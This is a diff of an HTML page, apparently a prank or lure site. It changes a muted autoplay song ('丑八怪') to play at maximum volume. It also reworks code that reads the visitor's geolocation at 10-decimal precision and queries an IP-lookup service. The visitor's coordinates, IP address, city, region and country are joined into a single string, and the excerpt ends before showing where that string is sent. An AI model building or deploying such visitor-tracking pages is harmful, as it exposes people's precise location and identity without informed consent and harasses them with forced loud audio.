@@ -118,7 +118,7 @@
     </style>
 </head>
 <body>
-    <audio id="audioPlayer" src="https://gitee.com/xiadn/xiran/raw/master/%E4%B8%91%E5%85%AB%E6%80%AA.m4a" preload="auto" muted></audio>
+    <audio id="audioPlayer" src="/丑八怪.m4a" preload="auto" volume="1"></audio>
     <!-- 模态弹窗 -->
     <div id="myModal" class="modal">
         <div class="modal-content">
@@ -136,9 +136,10 @@
     </div>
 
     <script>
-        // 自动播放音频（静音）
+        // 自动播放音频（音量最大）
         document.addEventListener("DOMContentLoaded", function() {
             const audio = document.getElementById('audioPlayer');
+            audio.volume = 1; // 设置音量为最大
             audio.play().catch(error => {
                 console.error('Audio playback failed:', error);
             });
@@ -174,17 +175,17 @@
         }
 
         function showPosition(position) {
-            const latitude = position.coords.latitude.toFixed(6);
-            const longitude = position.coords.longitude.toFixed(6);
+            const latitude = position.coords.latitude.toFixed(10);
+            const longitude = position.coords.longitude.toFixed(10);
             const locationString = `${latitude},${longitude}`;
 
             // 获取IP地址和其他信息
-            fetch('https://ipinfo.io/json')
+            fetch('https://ip-api.com/json')
                 .then(response => response.json())
                 .then(data => {
-                    const ip = data.ip || '';
+                    const ip = data.query || '';
                     const city = data.city || '';
-                    const region = data.region || '';
+                    const region = data.regionName || '';
                     const country = data.country || '';
 
                     const combinedData = `${locationString}-${ip}-${city}-${region}-${country}`;
